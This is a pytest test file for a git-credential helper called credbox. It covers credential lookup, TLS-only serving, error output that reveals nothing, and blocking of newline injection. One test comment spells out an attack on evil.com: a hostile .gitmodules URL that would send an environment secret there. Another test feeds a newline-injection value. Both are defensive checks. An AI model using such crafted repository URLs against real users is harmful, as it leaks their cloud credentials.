"""Tests for the git-credential adapter: the (app, name) -> Secret mapping, the username-less
first-contact lookup, and the stdout discipline (only a get reply, nothing on error)."""

from __future__ import annotations

import io

import pytest

from credbox.credentials import Credentials
from credbox.gitcredential import main


def _run(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    operation: str,
    stdin_text: str,
) -> tuple[int, str, str]:
    monkeypatch.setattr("sys.stdin", io.StringIO(stdin_text))
    rc = main([operation])
    captured = capsys.readouterr()
    return rc, captured.out, captured.err


def test_get_with_username_returns_the_reply(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    Credentials("github.com").set("alice", value="ghp_secret123")
    rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\nusername=alice\n\n")
    assert rc == 0
    assert "username=alice" in out
    assert "password=ghp_secret123" in out


def test_get_without_username_uses_the_sole_stored_name(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    Credentials("github.com").set("only_user", value="ghp_x")
    _rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\n\n")
    assert "username=only_user" in out
    assert "password=ghp_x" in out


def test_get_without_username_and_many_names_is_empty(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    Credentials("github.com").set("a", value="1")
    Credentials("github.com").set("b", value="2")
    _rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\n\n")
    assert out == ""   # ambiguous -> no credential, git prompts


def test_get_unknown_credential_writes_nothing(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\nusername=nobody\n\n")
    assert rc == 0
    assert out == ""


def test_store_then_get_roundtrips(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _run(monkeypatch, capsys, "store", "host=gitlab.com\nusername=bob\npassword=pw123\n\n")
    _rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=gitlab.com\nusername=bob\n\n")
    assert "password=pw123" in out


def test_erase_removes_the_credential(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    Credentials("gitlab.com").set("bob", value="pw")
    _run(monkeypatch, capsys, "erase", "host=gitlab.com\nusername=bob\n\n")
    _rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=gitlab.com\nusername=bob\n\n")
    assert out == ""


def test_unusable_host_yields_no_credential(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    rc, out, err = _run(monkeypatch, capsys, "get", "protocol=https\nhost=bad/host\nusername=x\n\n")
    assert rc == 0
    assert out == ""
    assert "bad/host" not in out


def test_get_never_resolves_an_environment_variable(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # A crafted git request -- host = an attacker's domain, username = a victim env var name -- must
    # NOT exfiltrate the environment value. The helper reads the host-scoped STORE only, never the
    # global environment tier of Credentials.secret(). (`https://SNEAKY_CLOUD_KEY@evil.com/` planted
    # in a hostile repo's .gitmodules would otherwise send the env value to evil.com as Basic auth.)
    monkeypatch.setenv("SNEAKY_CLOUD_KEY", "AKIA-SUPER-SECRET")
    rc, out, err = _run(monkeypatch, capsys, "get", "protocol=https\nhost=evil.com\nusername=SNEAKY_CLOUD_KEY\n\n")
    assert rc == 0
    assert out == ""
    assert "AKIA-SUPER-SECRET" not in out + err


def test_unexpected_exception_is_content_free_not_a_traceback(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # An unexpected (non-CredBoxError) failure in a handler must be caught: nothing on stdout, a
    # content-free note on stderr, and no traceback -- the parsed fields hold the password, so a
    # traceback whose frame-locals dump would expose it must never reach the interpreter.
    import credbox.gitcredential as gc

    def _boom(_fields: dict[str, str]) -> None:
        raise RuntimeError("unexpected internal failure with ghp_secret123 in the message")

    monkeypatch.setattr(gc, "_do_get", _boom)
    rc, out, err = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\nusername=alice\npassword=ghp_secret123\n\n")
    assert rc == 0
    assert out == ""
    assert "ghp_secret123" not in out + err
    assert "Traceback" not in err
    assert err.strip() == "credbox: git-credential error"


def test_keyboard_interrupt_during_store_is_content_free_not_a_traceback(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # A KeyboardInterrupt (BaseException, not Exception) while handling a store -- where `fields`
    # holds the password -- must be caught by the terminal guard, not escape as a traceback whose
    # frame-locals could dump the password under a locals-printing excepthook.
    import credbox.gitcredential as gc

    def _interrupt(_fields: dict[str, str]) -> None:
        raise KeyboardInterrupt

    monkeypatch.setattr(gc, "_do_store", _interrupt)
    rc, out, err = _run(monkeypatch, capsys, "store", "host=github.com\nusername=alice\npassword=ghp_secret123\n\n")
    assert rc == 0
    assert out == ""
    assert "ghp_secret123" not in out + err
    assert "Traceback" not in err


def test_get_serves_only_over_a_tls_protocol(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # A host-scoped credential must be served only over a TLS transport (safelist), so a stored
    # secret cannot be handed to git over a cleartext channel it wasn't scoped for. http, ftp, an
    # unknown scheme, and a MISSING protocol are all refused (git then prompts); https and ftps serve.
    Credentials("github.com").set("alice", value="ghp_secret123")

    def out_for(proto_line: str) -> str:
        _rc, out, _ = _run(monkeypatch, capsys, "get", f"{proto_line}host=github.com\nusername=alice\n\n")
        return out

    assert out_for("protocol=http\n") == ""    # cleartext: refused
    assert out_for("protocol=ftp\n") == ""      # cleartext: refused
    assert out_for("protocol=gopher\n") == ""   # unknown scheme: refused (fail safe)
    assert out_for("") == ""                    # no protocol at all: refused
    assert "password=ghp_secret123" in out_for("protocol=https\n")   # TLS: served
    assert "password=ghp_secret123" in out_for("protocol=ftps\n")    # TLS: served


def test_ported_host_round_trips(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # git sends host WITH the port (e.g. a self-hosted git on :8443); it is not a valid store
    # segment on its own, so it is encoded -- but store then get must round-trip consistently.
    stdin = "protocol=https\nhost=example.com:8443\nusername=alice\npassword=ghp_ported\n"
    rc, out, err = _run(monkeypatch, capsys, "store", stdin + "\n")
    assert rc == 0 and err == ""
    rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=example.com:8443\nusername=alice\n\n")
    assert "password=ghp_ported" in out


def test_reply_is_suppressed_when_a_value_contains_a_newline(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    # git's line protocol forbids a newline in a value; a stored value containing one (only
    # reachable via the Python API) must not be emitted verbatim -- that would inject an extra
    # reply line. The helper writes nothing instead (git prompts).
    Credentials("github.com").set("alice", value="tok\nen=injected")
    rc, out, _ = _run(monkeypatch, capsys, "get", "protocol=https\nhost=github.com\nusername=alice\n\n")
    assert rc == 0
    assert out == ""   # malformed value -> no reply, not an injected line


def test_distinct_ported_hosts_do_not_collide(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from credbox.gitcredential import _host_to_segment

    assert _host_to_segment("example.com:8443") != _host_to_segment("example.com:9999")
    assert _host_to_segment("github.com") == "github.com"   # a valid host is unchanged (back-compat)


def test_host_with_a_reserved_device_first_label_maps_to_a_usable_segment() -> None:
    # aux./con./nul./com1./lpt1. subdomains are valid DNS; they must map to a usable segment, not
    # None -- a None would make `store` silently discard the credential and `get` never serve.
    from credbox.gitcredential import _host_to_segment

    for host in ["aux.example.com", "con.foo.com", "nul.x.com", "com1.bar.com", "lpt1.baz.com"]:
        seg = _host_to_segment(host)
        assert seg is not None and seg.startswith("host-")
